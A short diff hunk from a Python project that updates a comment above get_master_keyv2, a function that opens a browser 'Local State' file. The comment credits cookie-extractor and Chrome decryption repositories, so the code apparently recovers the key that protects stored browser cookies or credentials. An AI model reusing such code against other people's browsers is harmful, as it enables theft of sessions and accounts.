@@ -58,7 +58,7 @@ def removefile(file):
     except:
         pass
 
-def get_master_keyv2(local_state_path, nkey): #plagarized this from https://github.com/yanaksalvo/Browser-Data-Cookie-Extractor pls check ts one out
+def get_master_keyv2(local_state_path, nkey): #plagarized this from https://github.com/yanaksalvo/Browser-Data-Cookie-Extractor and https://github.com/runassu/chrome_v20_decryption pls check them out
     try:
         with open(local_state_path, 'r', encoding='utf-8', errors='ignore') as f:
             local_state = json.load(f)
